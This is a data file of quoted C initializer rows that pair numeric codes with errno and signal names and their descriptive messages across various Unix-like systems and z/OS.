"{1150, """", """"},"
"{1151, """", """"},"
"{1152, ""EDC8152I"", ""The asynchronous I/O request has been canceled.""},"
"{1159, ""EDC8159I"", ""Function call was interrupted before any data was received.""},"
"{116, ""EDC5116I"", ""Resource deadlock avoided.""},"
"{116, ""EILSEQ"", ""invalid wide character""},"
"{116, ""ERESTART"", ""interrupted system call should be restarted""},"
"{116, ""ESTALE"", ""stale file handle""},"
"{1160, ""EDC8160I"", ""Socket reuse is not supported.""},"
"{1161, ""EDC8161I"", ""The file system cannot currently be moved.""},"
"{117, ""ECANCELED"", ""asynchronous I/O cancelled""},"
"{117, ""EDC5117I"", ""File exists.""},"
"{117, ""EUCLEAN"", ""structure needs cleaning""},"
"{118, ""EDC5118I"", ""Incorrect address.""},"
"{118, ""ENOSR"", ""out of STREAMS resources""},"
"{118, ""ENOTNAM"", ""not a XENIX named type file""},"
"{119, ""EDC5119I"", ""File too large.""},"
"{119, ""ENAVAIL"", ""no XENIX semaphores available""},"
"{119, ""ETIME"", ""system call timed out""},"
"{12, ""ENOMEM"", ""cannot allocate memory""},"
"{12, ""ENOMEM"", ""not enough space""},"
"{12, ""SIGSYS"", ""bad System Call""},"
"{12, ""SIGSYS"", ""bad argument to routine""},"
"{12, ""SIGSYS"", ""bad system call""},"
"{12, ""SIGUSR2"", ""user defined signal 2""},"
"{120, ""EBADMSG"", ""next message has wrong type""},"
"{120, ""EDC5120I"", ""Interrupted function call.""},"
"{120, ""EISNAM"", ""is a named type file""},"
"{120, ""EPROTONOSUPPORT"", ""protocol not supported""},"
"{121, ""EDC5121I"", ""Invalid argument.""},"
"{121, ""EPROTO"", ""error in protocol""},"
"{121, ""EREMOTEIO"", ""remote I/O error""},"
"{121, ""ESOCKTNOSUPPORT"", ""socket type not supported""},"
"{122, ""EDC5122I"", ""Input/output error.""},"
"{122, ""EDQUOT"", ""disk quota exceeded""},"
"{122, ""EILSEQ"", ""invalid or incomplete multibyte or wide character""},"
"{122, ""ENODATA"", ""no message on stream head read q""},"
"{122, ""ENOTSUP"", ""operation not supported""},"
"{122, ""EOPNOTSUPP"", ""operation not supported on transport endpoint""},"
"{123, ""EDC5123I"", ""Is a directory.""},"
"{123, ""ELIBMAX"", ""attempting to link in too many shared libraries""},"
"{123, ""ENOMEDIUM"", ""no medium found""},"
"{123, ""ENOSTR"", ""fd not associated with a stream""},"
"{123, ""EPFNOSUPPORT"", ""protocol family not supported""},"
"{124, ""EAFNOSUPPORT"", ""address family not supported by protocol family""},"
"{124, ""EAFNOSUPPORT"", ""address family not supported by protocol""},"
"{124, ""EDC5124I"", ""Too many open files.""},"
"{124, ""ELIBSCN"", "".lib section in a.out corrupted""},"
"{124, ""EMEDIUMTYPE"", ""wrong medium type""},"
"{124, ""ENOTSUP"", ""unsupported attribute value""},"
"{125, ""EADDRINUSE"", ""address already in use""},"
"{125, ""ECANCELED"", ""operation canceled""},"
"{125, ""EDC5125I"", ""Too many links.""},"
"{125, ""EMULTIHOP"", ""multihop is not allowed""},"
"{125, ""ENOMEDIUM"", ""no medium found""},"
"{126, ""EADDRNOTAVAIL"", ""cannot assign requested address""},"
"{126, ""EDC5126I"", ""Filename too long.""},"
"{126, ""EMEDIUMTYPE"", ""wrong medium type""},"
"{126, ""ENOKEY"", ""required key not available""},"
"{126, ""ENOLINK"", ""the server link has been severed""},"
"{127, ""ECANCELED"", ""operation canceled""},"
"{127, ""EDC5127I"", ""Too many open files in system.""},"
"{127, ""EKEYEXPIRED"", ""key has expired""},"
"{127, ""ENETDOWN"", ""network is down""},"
"{127, ""EOVERFLOW"", ""value too large to be stored in data type""},"
"{128, ""EDC5128I"", ""No such device.""},"
"{128, ""EKEYREVOKED"", ""key has been revoked""},"
"{128, ""ENETUNREACH"", ""network is unreachable""},"
"{128, ""ENOKEY"", ""required key not available""},"
"{129, ""EDC5129I"", ""No such file or directory.""},"
"{129, ""EKEYEXPIRED"", ""key has expired""},"
"{129, ""EKEYREJECTED"", ""key was rejected by service""},"
"{129, ""ENETRESET"", ""network dropped connection because of reset""},"
"{129, ""ENETRESET"", ""network dropped connection on reset""},"
"{13, ""EACCES"", ""permission denied""},"
"{13, ""SIGPIPE"", ""broken Pipe""},"
"{13, ""SIGPIPE"", ""broken pipe""},"
"{130, ""ECONNABORTED"", ""software caused connection abort""},"
"{130, ""EDC5130I"", ""Exec format error.""},"
"{130, ""EKEYREVOKED"", ""key has been revoked""},"
"{130, ""EOWNERDEAD"", ""owner died""},"
"{131, ""ECONNRESET"", ""connection reset by peer""},"
"{131, ""EDC5131I"", ""No locks available.""},"
"{131, ""EKEYREJECTED"", ""key was rejected by service""},"
"{131, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{132, ""EDC5132I"", ""Not enough memory.""},"
"{132, ""ENOBUFS"", ""no buffer space available""},"
"{132, ""EOWNERDEAD"", ""owner died""},"
"{132, ""ERFKILL"", ""operation not possible due to RF-kill""},"
"{133, ""EDC5133I"", ""No space left on device.""},"
"{133, ""EHWPOISON"", ""memory page has hardware error""},"
"{133, ""EISCONN"", ""transport endpoint is already connected""},"
"{133, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{134, ""EDC5134I"", ""Function not implemented.""},"
"{134, ""ENOTCONN"", ""transport endpoint is not connected""},"
"{134, ""ERFKILL"", ""operation not possible due to RF-kill""},"
"{135, ""EDC5135I"", ""Not a directory.""},"
"{135, ""EHWPOISON"", ""memory page has hardware error""},"
"{135, ""EUCLEAN"", ""structure needs cleaning""},"
"{136, ""EDC5136I"", ""Directory not empty.""},"
"{137, ""EDC5137I"", ""Inappropriate I/O control operation.""},"
"{137, ""ENOTNAM"", ""not a XENIX named type file""},"
"{138, ""EDC5138I"", ""No such device or address.""},"
"{138, ""ENAVAIL"", ""no XENIX semaphores available""},"
"{139, ""EDC5139I"", ""Operation not permitted.""},"
"{139, ""EISNAM"", ""is a named type file""},"
"{14, ""EFAULT"", ""bad address""},"
"{14, ""SIGALRM"", ""alarm Clock""},"
"{14, ""SIGALRM"", ""alarm clock""},"
"{140, ""EDC5140I"", ""Broken pipe.""},"
"{140, ""EREMOTEIO"", ""remote I/O error""},"
"{141, ""EDC5141I"", ""Read-only file system.""},"
"{141, ""EINIT"", ""unknown error 141""},"
"{142, ""EDC5142I"", ""Invalid seek.""},"
"{142, ""EREMDEV"", ""unknown error 142""},"
"{143, ""EDC5143I"", ""No such process.""},"
"{143, ""ESHUTDOWN"", ""cannot send after socket shutdown""},"
"{143, ""ESHUTDOWN"", ""cannot send after transport endpoint shutdown""},"
"{144, ""EDC5144I"", ""Improper link.""},"
"{144, ""ETOOMANYREFS"", ""too many references: cannot splice""},"
"{145, ""EDC5145I"", ""The parameter list is too long, or the message to receive was too large for the buffer.""},"
"{145, ""ETIMEDOUT"", ""connection timed out""},"
"{146, ""ECONNREFUSED"", ""connection refused""},"
"{146, ""EDC5146I"", ""Too many levels of symbolic links.""},"
"{147, ""EDC5147I"", ""Illegal byte sequence.""},"
"{147, ""EHOSTDOWN"", ""host is down""},"
"{148, """", """"},"
"{148, ""EHOSTUNREACH"", ""no route to host""},"
"{149, ""EALREADY"", ""operation already in progress""},"
"{149, ""EDC5149I"", ""Value Overflow Error.""},"
"{15, ""ENOTBLK"", ""block device required""},"
"{15, ""SIGTERM"", ""terminated""},"
"{150, ""EDC5150I"", ""UNIX System Services is not active.""},"
"{150, ""EINPROGRESS"", ""operation now in progress""},"
"{151, ""EDC5151I"", ""Dynamic allocation error.""},"
"{151, ""ESTALE"", ""stale NFS file handle""},"
"{151, ""ESTALE"", ""stale file handle""},"
"{152, ""EDC5152I"", ""Common VTOC access facility (CVAF) error.""},"
"{153, ""EDC5153I"", ""Catalog obtain error.""},"
"{156, ""EDC5156I"", ""Process initialization error.""},"
"{157, ""EDC5157I"", ""An internal error has occurred.""},"
"{158, ""ECANCELED"", ""operation canceled""},"
"{158, ""EDC5158I"", ""Bad parameters were passed to the service.""},"
"{159, ""EDC5159I"", ""The Physical File System encountered a permanent file error.""},"
"{159, ""ENOMEDIUM"", ""no medium found""},"
"{16, ""EBUSY"", ""device busy""},"
"{16, ""EBUSY"", ""device or resource busy""},"
"{16, ""EBUSY"", ""resource busy""},"
"{16, ""SIGSTKFLT"", ""stack fault""},"
"{16, ""SIGURG"", ""urgent I/O condition""},"
"{16, ""SIGUSR1"", ""user Signal 1""},"
"{16, ""SIGUSR1"", ""user defined signal 1""},"
"{160, ""EDC5160I"", ""Bad character in environment variable name.""},"
"{160, ""EMEDIUMTYPE"", ""wrong medium type""},"
"{161, ""ENOKEY"", ""required key not available""},"
"{162, ""EDC5162I"", ""The Physical File System encountered a system error.""},"
"{162, ""EKEYEXPIRED"", ""key has expired""},"
"{163, ""EDC5163I"", ""SAF/RACF extract error.""},"
"{163, ""EKEYREVOKED"", ""key has been revoked""},"
"{164, ""EDC5164I"", ""SAF/RACF error.""},"
"{164, ""EKEYREJECTED"", ""key was rejected by service""},"
"{165, ""EDC5165I"", ""System TOD clock not set.""},"
"{165, ""EOWNERDEAD"", ""owner died""},"
"{166, ""EDC5166I"", ""Access mode argument on function call conflicts with PATHOPTS parameter on JCL DD statement.""},"
"{166, ""ENOTRECOVERABLE"", ""state not recoverable""},"
"{167, ""EDC5167I"", ""Access to the UNIX System Services version of the C RTL is denied.""},"
"{167, ""ERFKILL"", ""operation not possible due to RF-kill""},"
"{168, ""EDC5168I"", ""Password has expired.""},"
"{168, ""EHWPOISON"", ""memory page has hardware error""},"
"{169, ""EDC5169I"", ""Password is invalid.""},"
"{17, ""EEXIST"", ""file exists""},"
"{17, ""ENOTEMPTY"", ""file exists""},"
"{17, ""SIGCHLD"", ""child exited""},"
"{17, ""SIGSTOP"", ""stopped (signal)""},"
"{17, ""SIGSTOP"", ""suspended (signal)""},"
"{17, ""SIGUSR2"", ""user Signal 2""},"
"{17, ""SIGUSR2"", ""user defined signal 2""},"
"{170, ""EDC5170I"", ""An error was encountered with WLM.""},"
"{171, ""EDC5171I"", ""An error was encountered with CPL.""},"
"{172, ""EDC5172I"", ""An error was encountered with Application Response Measurement (ARM) component.""},"
"{18, ""EXDEV"", ""cross-device link""},"
"{18, ""EXDEV"", ""invalid cross-device link""},"
"{18, ""SIGABND"", ""abend""},"
"{18, ""SIGCHLD"", ""child Status Changed""},"
"{18, ""SIGCHLD"", ""child exited""},"
"{18, ""SIGCONT"", ""continued""},"
"{18, ""SIGTSTP"", ""stopped""},"
"{18, ""SIGTSTP"", ""suspended""},"
"{19, ""ENODEV"", ""no such device""},"
"{19, ""ENODEV"", ""operation not supported by device""},"
"{19, ""SIGCONT"", ""continued""},"
"{19, ""SIGPWR"", ""power failure""},"
"{19, ""SIGPWR"", ""power-Fail/Restart""},"
"{19, ""SIGSTOP"", ""stopped (signal)""},"
"{2, ""EDC5002I"", ""A range error occurred.""},"
"{2, ""ENOENT"", ""no such file or directory""},"
"{2, ""SIGINT"", ""interrupt""},"
"{20, ""ENOTDIR"", ""not a directory""},"
"{20, ""SIGCHLD"", ""child exited""},"
"{20, ""SIGTSTP"", ""stopped""},"
"{20, ""SIGWINCH"", ""window Size Change""},"
"{20, ""SIGWINCH"", ""window changed""},"
"{200, ""EDC5200I"", ""The application contains a Language Environment member language that cannot tolerate a fork().""},"
"{201, ""EDC5201I"", ""The Language Environment message file was not found in the hierarchical file system.""},"
"{202, ""EDC5202E"", ""DLL facilities are not supported under SPC environment.""},"
"{203, ""EDC5203E"", ""DLL facilities are not supported under POSIX environment.""},"
"{21, ""EISDIR"", ""is a directory""},"
"{21, ""SIGTTIN"", ""stopped (tty input)""},"
"{21, ""SIGURG"", ""urgent I/O condition""},"
"{21, ""SIGURG"", ""urgent Socket Condition""},"
"{22, ""EINVAL"", ""invalid argument""},"
"{22, ""SIGIO"", ""I/O possible""},"
"{22, ""SIGIO"", ""pollable Event""},"
"{22, ""SIGTTOU"", ""stopped (tty output)""},"
"{227, ""EDC5227I"", ""Buffer is not long enough to contain a path definition""},"
"{228, ""EDC5228I"", ""The file referred to is an external link""},"
"{229, ""EDC5229I"", ""No path definition for ddname in effect""},"
"{23, ""ENFILE"", ""file table overflow""},"
"{23, ""ENFILE"", ""too many open files in system""},"
"{23, ""SIGIO"", ""I/O possible""},"
"{23, ""SIGIO"", ""I/O possible/complete""},"
"{23, ""SIGSTOP"", ""stopped (signal)""},"
"{23, ""SIGURG"", ""urgent I/O condition""},"
"{230, ""EDC5230I"", ""ESM error.""},"
"{231, ""EDC5231I"", ""CP or the external security manager had an error""},"
"{232, ""EDC5232I"", ""The function failed because it was invoked from a multithread environment.""},"
"{24, ""EMFILE"", ""too many open files""},"
"{24, ""SIGQUIT"", ""quit""},"
"{24, ""SIGTSTP"", ""stopped (user)""},"
"{24, ""SIGTSTP"", ""stopped""},"
"{24, ""SIGXCPU"", ""CPU time limit exceeded""},"
"{24, ""SIGXCPU"", ""cputime limit exceeded""},"
"{244, ""EDC5244I"", ""The program, module or DLL is not supported in this environment.""},"
"{245, ""EDC5245I"", ""Data is not valid.""},"
"{246, ""EDC5246I"", ""Unknown system state.""},"
"{247, ""EDC5247I"", ""Operation not supported.""},"
"{248, ""EDC5248I"", ""The object name specified is not correct.""},"
"{249, ""EDC5249I"", ""The function is not allowed.""},"
"{25, ""ENOTTY"", ""inappropriate ioctl for device""},"
"{25, ""ENOTTY"", ""not a typewriter""},"
"{25, ""SIGCONT"", ""continued""},"
"{25, ""SIGTSTP"", ""stopped""},"
"{25, ""SIGXFSZ"", ""file size limit exceeded""},"
"{25, ""SIGXFSZ"", ""filesize limit exceeded""},"
"{255, ""SIGMAX"", ""signal 255""},"
"{257, ""EDC5257I"", ""Function cannot be called in the child process of a fork() from a multithreaded process until exec() is called.""},"
"{258, ""EDC5258I"", ""A CUN_RS_NO_UNI_ENV error was issued by Unicode Services.""},"
"{259, ""EDC5259I"", ""A CUN_RS_NO_CONVERSION error was issued by Unicode Services.""},"
"{26, ""ETXTBSY"", ""text file busy""},"
"{26, ""SIGTRAP"", ""trace/breakpoint trap""},"
"{26, ""SIGTTIN"", ""stopped (tty input)""},"
"{26, ""SIGVTALRM"", ""virtual timer expired""},"
"{260, ""EDC5260I"", ""A CUN_RS_TABLE_NOT_ALIGNED error was issued by Unicode Services.""},"
"{262, ""EDC5262I"", ""An iconv() function encountered an unexpected error while using Unicode Services.""},"
"{27, ""EFBIG"", ""file too large""},"
"{27, ""SIGIOER"", ""I/O error""},"
"{27, ""SIGMSG"", ""input device data""},"
"{27, ""SIGPROF"", ""profiling timer expired""},"
"{27, ""SIGTTOU"", ""stopped (tty output)""},"
"{28, ""ENOSPC"", ""no space left on device""},"
"{28, ""SIGVTALRM"", ""virtual Timer Expired""},"
"{28, ""SIGVTALRM"", ""virtual timer expired""},"
"{28, ""SIGWINCH"", ""window changed""},"
"{28, ""SIGWINCH"", ""window size changes""},"
"{29, ""ESPIPE"", ""illegal seek""},"
"{29, ""SIGINFO"", ""information request""},"
"{29, ""SIGIO"", ""I/O possible""},"
"{29, ""SIGLOST"", ""power failure""},"
"{29, ""SIGPROF"", ""profiling Timer Expired""},"
"{29, ""SIGPROF"", ""profiling timer expired""},"
"{29, ""SIGPWR"", ""power-failure""},"
"{29, ""SIGXCPU"", ""CPU time limit exceeded""},"
"{3, ""ESRCH"", ""no such process""},"
"{3, ""SIGABT"", ""aborted""},"
"{3, ""SIGQUIT"", ""quit""},"
"{30, ""EROFS"", ""read-only file system""},"
"{30, ""SIGPWR"", ""power failure""},"
"{30, ""SIGUSR1"", ""user defined signal 1""},"
"{30, ""SIGXCPU"", ""CPU time limit exceeded""},"
"{30, ""SIGXCPU"", ""cpu Limit Exceeded""},"
"{30, ""SIGXFSZ"", ""file size limit exceeded""},"
"{31, ""EMLINK"", ""too many links""},"
"{31, ""SIGSYS"", ""bad system call""},"
"{31, ""SIGUSR2"", ""user defined signal 2""},"
"{31, ""SIGVTALRM"", ""virtual timer expired""},"
"{31, ""SIGXFSZ"", ""file Size Limit Exceeded""},"
"{31, ""SIGXFSZ"", ""file size limit exceeded""},"
"{32, ""EPIPE"", ""broken pipe""},"
"{32, ""SIGPROF"", ""profiling timer expired""},"
"{32, ""SIGPWR"", ""power fail/restart""},"
"{32, ""SIGTHR"", ""thread AST""},"
"{32, ""SIGTHR"", ""thread Scheduler""},"
"{32, ""SIGTHR"", ""unknown signal""},"
"{32, ""SIGWAITING"", ""no runnable lwp""},"
"{33, ""EDOM"", ""argument out of domain""},"
"{33, ""EDOM"", ""numerical argument out of domain""},"
"{33, ""SIGCKPT"", ""checkPoint""},"
"{33, ""SIGDANGER"", ""danger""},"
"{33, ""SIGDANGER"", ""paging space low""},"
"{33, ""SIGLIBRT"", ""unknown signal""},"
"{33, ""SIGLWP"", ""inter-lwp signal""},"
"{34, ""ERANGE"", ""numerical result out of range""},"
"{34, ""ERANGE"", ""result too large or too small""},"
"{34, ""ERANGE"", ""result too large""},"
"{34, ""SIGCKPTEXIT"", ""checkPointExit""},"
"{34, ""SIGFREEZE"", ""checkpoint Freeze""},"
"{34, ""SIGTHSTOP"", ""stop thread""},"
"{34, ""SIGVTALRM"", ""virtual timer expired""},"
"{35, ""EAGAIN"", ""resource temporarily unavailable""},"
"{35, ""EDEADLK"", ""resource deadlock avoided""},"
"{35, ""ENOMSG"", ""no message of desired type""},"
"{35, ""EWOULDBLOCK"", ""resource temporarily unavailable""},"
"{35, ""SIGMIGRATE"", ""signal 35""},"
"{35, ""SIGTHAW"", ""checkpoint Thaw""},"
"{35, ""SIGTHCONT"", ""continue thread""},"
"{36, ""EIDRM"", ""identifier removed""},"
"{36, ""EINPROGRESS"", ""operation now in progress""},"
"{36, ""ENAMETOOLONG"", ""file name too long""},"
"{36, ""SIGCANCEL"", ""thread Cancellation""},"
"{36, ""SIGPRE"", ""signal 36""},"
"{37, ""EALREADY"", ""operation already in progress""},"
"{37, ""ECHRNG"", ""channel number out of range""},"
"{37, ""ENOLCK"", ""no locks available""},"
"{37, ""SIGLOST"", ""resource Lost""},"
"{37, ""SIGTRACE"", ""trace""},"
"{37, ""SIGVIRT"", ""signal 37""},"
"{38, """", ""DCE""},"
"{38, ""EL2NSYNC"", ""level 2 not synchronized""},"
"{38, ""ENOSYS"", ""function not implemented""},"
"{38, ""ENOTSOCK"", ""socket operation on non-socket""},"
"{38, ""SIGTALRM"", ""signal 38""},"
"{38, ""SIGXRES"", ""resource Control Exceeded""},"
"{39, ""EDESTADDRREQ"", ""destination address required""},"
"{39, ""EL3HLT"", ""level 3 halted""},"
"{39, ""ENOTEMPTY"", ""directory not empty""},"
"{39, ""SIGDUMP"", ""dump""},"
"{39, ""SIGJVM1"", ""reserved for JVM 1""},"
"{39, ""SIGWAITING"", ""signal 39""},"
"{4, ""EINTR"", ""interrupted system call""},"
"{4, ""SIGILL"", ""illegal Instruction""},"
"{4, ""SIGILL"", ""illegal instruction""},"
"{40, ""EL3RST"", ""level 3 reset""},"
"{40, ""ELOOP"", ""too many levels of symbolic links""},"
"{40, ""EMSGSIZE"", ""message too long""},"
"{40, ""SIGJVM2"", ""reserved for JVM 2""},"
"{41, ""ELNRNG"", ""link number out of range""},"
"{41, ""EPROTOTYPE"", ""protocol wrong type for socket""},"
"{41, ""SIGINFO"", ""information Request""},"
"{42, ""ENOMSG"", ""no message of desired type""},"
"{42, ""ENOPROTOOPT"", ""protocol not available""},"
"{42, ""ENOPROTOOPT"", ""protocol option not available""},"
"{42, ""EUNATCH"", ""protocol driver not attached""},"
"{43, ""EIDRM"", ""identifier removed""},"
"{43, ""ENOCSI"", ""no CSI structure available""},"
"{43, ""EPROTONOSUPPORT"", ""protocol not supported""},"
"{44, ""ECHRNG"", ""channel number out of range""},"
"{44, ""EL2HLT"", ""level 2 halted""},"
"{44, ""ESOCKTNOSUPPORT"", ""socket type not supported""},"
"{45, ""EDEADLK"", ""deadlock condition if locked""},"
"{45, ""EDEADLK"", ""deadlock situation detected/avoided""},"
"{45, ""EDEADLK"", ""resource deadlock avoided""},"
"{45, ""EL2NSYNC"", ""level 2 not synchronized""},"
"{45, ""ENOTSUP"", ""operation not supported""},"
"{45, ""EOPNOTSUPP"", ""operation not supported""},"
"{46, ""EL3HLT"", ""level 3 halted""},"
"{46, ""ENOLCK"", ""no locks available""},"
"{46, ""ENOLCK"", ""no record locks available""},"
"{46, ""ENOTREADY"", ""device not ready""},"
"{46, ""EPFNOSUPPORT"", ""protocol family not supported""},"
"{47, ""EAFNOSUPPORT"", ""address family not supported by protocol family""},"
"{47, ""EAFNOSUPPORT"", ""address family not supported by protocol""},"
"{47, ""ECANCELED"", ""operation canceled""},"
"{47, ""EL3RST"", ""level 3 reset""},"
"{47, ""EWRPROTECT"", ""write-protected media""},"
"{48, ""EADDRINUSE"", ""address already in use""},"
"{48, ""EFORMAT"", ""unformatted or incompatible media""},"
"{48, ""ELNRNG"", ""link number out of range""},"
"{48, ""ENOTSUP"", ""operation not supported""},"
"{48, ""SIGSYSERROR"", ""signal 48""},"
"{49, ""EADDRNOTAVAIL"", ""can't assign requested address""},"
"{49, ""EADDRNOTAVAIL"", ""cannot assign requested address""},"
"{49, ""EDQUOT"", ""disc quota exceeded""},"
"{49, ""ENOLCK"", ""no locks available""},"
"{49, ""EUNATCH"", ""protocol driver not attached""},"
"{49, ""SIGCAPI"", ""signal 49""},"
"{5, ""EIO"", ""I/O error""},"
"{5, ""EIO"", ""input/output error""},"
"{5, ""SIGPOLL"", ""pollable event""},"
"{5, ""SIGTRAP"", ""trace/BPT trap""},"
"{5, ""SIGTRAP"", ""trace/Breakpoint Trap""},"
"{5, ""SIGTRAP"", ""trace/breakpoint trap""},"
"{50, ""EBADE"", ""bad exchange descriptor""},"
"{50, ""EBADE"", ""invalid exchange""},"
"{50, ""ENETDOWN"", ""network is down""},"
"{50, ""ENOCONNECT"", ""cannot Establish Connection""},"
"{50, ""ENOCSI"", ""no CSI structure available""},"
"{51, ""EBADR"", ""bad request descriptor""},"
"{51, ""EBADR"", ""invalid request descriptor""},"
"{51, ""EL2HLT"", ""level 2 halted""},"
"{51, ""ENETUNREACH"", ""network is unreachable""},"
"{52, ""EBADE"", ""invalid exchange""},"
"{52, ""ENETRESET"", ""network dropped connection on reset""},"
"{52, ""ESTALE"", ""missing file or filesystem""},"
"{52, ""EXFULL"", ""exchange full""},"
"{52, ""EXFULL"", ""message tables full""},"
"{53, ""EBADR"", ""invalid request descriptor""},"
"{53, ""ECONNABORTED"", ""software caused connection abort""},"
"{53, ""EDIST"", ""requests blocked by Administrator""},"
"{53, ""ENOANO"", ""anode table overflow""},"
"{53, ""ENOANO"", ""no anode""},"
"{54, ""EBADRQC"", ""bad request code""},"
"{54, ""EBADRQC"", ""invalid request code""},"
"{54, ""ECONNRESET"", ""connection reset by peer""},"
"{54, ""EXFULL"", ""exchange full""},"
"{55, ""EBADSLT"", ""invalid slot""},"
"{55, ""EINPROGRESS"", ""operation now in progress""},"
"{55, ""ENOANO"", ""no anode""},"
"{55, ""ENOBUFS"", ""no buffer space available""},"
"{56, ""EALREADY"", ""operation already in progress""},"
"{56, ""EBADRQC"", ""invalid request code""},"
"{56, ""EDEADLOCK"", ""file locking deadlock error""},"
"{56, ""EDEADLOCK"", ""file locking deadlock""},"
"{56, ""EISCONN"", ""socket is already connected""},"
"{56, ""EISCONN"", ""transport endpoint is already connected""},"
"{57, ""EBADSLT"", ""invalid slot""},"
"{57, ""EBFONT"", ""bad font file format""},"
"{57, ""ENOTCONN"", ""socket is not connected""},"
"{57, ""ENOTCONN"", ""transport endpoint is not connected""},"
"{57, ""ENOTSOCK"", ""socket operation on non-socket""},"
"{58, ""EDEADLOCK"", ""file locking deadlock error""},"
"{58, ""EDESTADDREQ"", ""destination address required""},"
"{58, ""EOWNERDEAD"", ""owner of the lock died""},"
"{58, ""ESHUTDOWN"", ""can't send after socket shutdown""},"
"{58, ""ESHUTDOWN"", ""cannot send after transport endpoint shutdown""},"
"{58, ""SIGRECONFIG"", ""signal 58""},"
"{59, ""EBFONT"", ""bad font file format""},"
"{59, ""EMSGSIZE"", ""message too long""},"
"{59, ""ENOTRECOVERABLE"", ""lock is not recoverable""},"
"{59, ""ETOOMANYREFS"", ""too many references: can't splice""},"
"{59, ""ETOOMANYREFS"", ""too many references: cannot splice""},"
"{59, ""SIGCPUFAIL"", ""CPU Failure Predicted""},"
"{6, ""ENXIO"", ""device not configured""},"
"{6, ""ENXIO"", ""no such device or address""},"
"{6, ""SIGABRT"", ""abort trap""},"
"{6, ""SIGABRT"", ""abort""},"
"{6, ""SIGABRT"", ""aborted""},"
"{6, ""SIGIOT"", ""IOT/Abort trap""},"
"{6, ""SIGIOT"", ""abort trap""},"
"{6, ""SIGURG"", ""urgent I/O condition""},"
"{60, ""ENOSTR"", ""device not a stream""},"
"{60, ""ENOSTR"", ""not a stream device""},"
"{60, ""EPROTOTYPE"", ""protocol wrong type for socket""},"
"{60, ""ETIMEDOUT"", ""connection timed out""},"
"{60, ""ETIMEDOUT"", ""operation timed out""},"
"{60, ""SIGGRANT"", ""monitor mode granted""},"
"{60, ""SIGKAP"", ""monitor mode granted""},"
"{61, ""ECONNREFUSED"", ""connection refused""},"
"{61, ""ENODATA"", ""no data available""},"
"{61, ""ENOPROTOOPT"", ""protocol not available""},"
"{61, ""SIGRETRACT"", ""monitor mode retracted""},"
"{62, ""ELOOP"", ""too many levels of symbolic links""},"
"{62, ""EPROTONOSUPPORT"", ""protocol not supported""},"
"{62, ""ETIME"", ""timer expired""},"
"{62, ""SIGSOUND"", ""sound completed""},"
"{63, ""ENAMETOOLONG"", ""file name too long""},"
"{63, ""ENOSR"", ""out of stream resources""},"
"{63, ""ENOSR"", ""out of streams resources""},"
"{63, ""ESOCKTNOSUPPORT"", ""socket type not supported""},"
"{63, ""SIGMAX32"", ""secure attention""},"
"{63, ""SIGSAK"", ""secure attention""},"
"{64, ""EHOSTDOWN"", ""host is down""},"
"{64, ""ENONET"", ""machine is not on the network""},"
"{64, ""EOPNOTSUPP"", ""operation not supported on socket""},"
"{65, ""EHOSTUNREACH"", ""no route to host""},"
"{65, ""ENOPKG"", ""package not installed""},"
"{65, ""EPFNOSUPPORT"", ""protocol family not supported""},"
"{66, ""EAFNOSUPPORT"", ""addr family not supported by protocol""},"
"{66, ""ENOTEMPTY"", ""directory not empty""},"
"{66, ""EREMOTE"", ""object is remote""},"
"{67, ""EADDRINUSE"", ""address already in use""},"
"{67, ""ENOLINK"", ""link has been severed""},"
"{67, ""EPROCLIM"", ""too many processes""},"
"{68, ""EADDRNOTAVAIL"", ""can't assign requested address""},"
"{68, ""EADV"", ""advertise error""},"
"{68, ""EUSERS"", ""too many users""},"
"{69, ""EDQUOT"", ""disc quota exceeded""},"
"{69, ""EDQUOT"", ""disk quota exceeded""},"
"{69, ""ENETDOWN"", ""network is down""},"
"{69, ""ESRMNT"", ""srmount error""},"
"{7, ""E2BIG"", ""arg list too long""},"
"{7, ""E2BIG"", ""argument list too long""},"
"{7, ""SIGBUS"", ""bus error""},"
"{7, ""SIGEMT"", ""EMT trap""},"
"{7, ""SIGEMT"", ""emulation Trap""},"
"{7, ""SIGSTOP"", ""stop process""},"
"{70, ""ECOMM"", ""communication error on send""},"
"{70, ""ENETUNREACH"", ""network is unreachable""},"
"{70, ""ESTALE"", ""stale NFS file handle""},"
"{70, ""ESTALE"", ""stale file handle""},"
"{71, ""ENETRESET"", ""network dropped connection on reset""},"
"{71, ""EPROTO"", ""protocol error""},"
"{71, ""EREMOTE"", ""object is remote""},"
"{71, ""EREMOTE"", ""too many levels of remote in path""},"
"{72, ""EBADRPC"", ""RPC struct is bad""},"
"{72, ""ECONNABORTED"", ""software caused connection abort""},"
"{72, ""ELOCKUNMAPPED"", ""locked lock was unmapped ""},"
"{72, ""EMULTIHOP"", ""multihop attempted""},"
"{72, ""ENOSTR"", ""device not a stream""},"
"{73, ""ECONNRESET"", ""connection reset by peer""},"
"{73, ""EDOTDOT"", ""RFS specific error""},"
"{73, ""ENOTACTIVE"", ""facility is not active""},"
"{73, ""ERPCMISMATCH"", ""RPC version wrong""},"
"{73, ""ETIME"", ""timer expired""},"
"{74, ""EBADMSG"", ""bad message""},"
"{74, ""EMULTIHOP"", ""multihop attempted""},"
"{74, ""ENOBUFS"", ""no buffer space available""},"
"{74, ""ENOSR"", ""out of streams resources""},"
"{74, ""EPROGUNAVAIL"", ""RPC prog. not avail""},"
"{74, ""EPROGUNAVAIL"", ""RPC program not available""},"
"{75, ""EISCONN"", ""socket is already connected""},"
"{75, ""ENOMSG"", ""no message of desired type""},"
"{75, ""EOVERFLOW"", ""value too large for defined data type""},"
"{75, ""EPROGMISMATCH"", ""program version wrong""},"
"{76, ""EBADMSG"", ""bad message""},"
"{76, ""ENOTCONN"", ""socket is not connected""},"
"{76, ""ENOTUNIQ"", ""name not unique on network""},"
"{76, ""EPROCUNAVAIL"", ""bad procedure for program""},"
"{77, ""EBADFD"", ""file descriptor in bad state""},"
"{77, ""EBADMSG"", ""bad message""},"
"{77, ""EBADMSG"", ""not a data message""},"
"{77, ""EIDRM"", ""identifier removed""},"
"{77, ""ENOLCK"", ""no locks available""},"
"{77, ""ESHUTDOWN"", ""can't send after socket shutdown""},"
"{78, ""EDEADLK"", ""resource deadlock avoided""},"
"{78, ""ENAMETOOLONG"", ""file name too long""},"
"{78, ""ENOSYS"", ""function not implemented""},"
"{78, ""EREMCHG"", ""remote address changed""},"
"{78, ""ETIMEDOUT"", ""connection timed out""},"
"{79, ""ECONNREFUSED"", ""connection refused""},"
"{79, ""EFTYPE"", ""inappropriate file type or format""},"
"{79, ""ELIBACC"", ""can not access a needed shared library""},"
"{79, ""ENOLCK"", ""no locks available""},"
